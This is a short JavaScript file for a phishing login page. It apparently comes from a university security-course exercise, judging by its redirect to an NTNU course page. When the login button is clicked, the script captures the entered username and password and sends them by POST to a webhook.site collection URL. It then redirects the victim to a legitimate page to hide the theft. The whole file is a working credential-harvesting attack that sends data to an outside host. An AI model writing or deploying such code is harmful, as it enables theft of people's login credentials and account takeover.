// Select the button
let elButton, elUsername, elPassword;

elButton = document.querySelector("#loginButton"); // Select the button
elUsername = document.querySelector("#username"); // Select the username input field
elPassword = document.querySelector("#password"); // Select the password input field

let webhookURL = "https://webhook.site/f589e9fb-65cb-4921-905b-b23b6f3cd199"; // webhook.site URL
let redirectURL = "https://www.ntnu.edu/studies/courses/IIK3100#tab=omEmnet"; // Redirect URL


// Add event listener for webhook
elButton.addEventListener('click', function(event) {
    event.preventDefault(); // Prevent the default form submission

    console.log("Sending credentials...");

    // Get the username and password values
    const username = elUsername.value;
    const password = elPassword.value;

    // Create an object with the data to send
    const data = {
        email: username,
        password: password
    };

    // Make a POST request to the webhook URL
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        mode: 'no-cors', // Set no-cors mode
        body: JSON.stringify(data)
    })
    .then(response => {
        console.log("Status" + response.status.toString());
        if (response.ok) {
            console.log('Data successfully sent');
            // You can add further actions upon successful data submission
        } else {
            console.log('Failed to send data');
            // Handle the failure to send data
        }
        window.location.href = redirectURL;
    })
    .catch(error => {
        console.error('Error:', error);
    });
});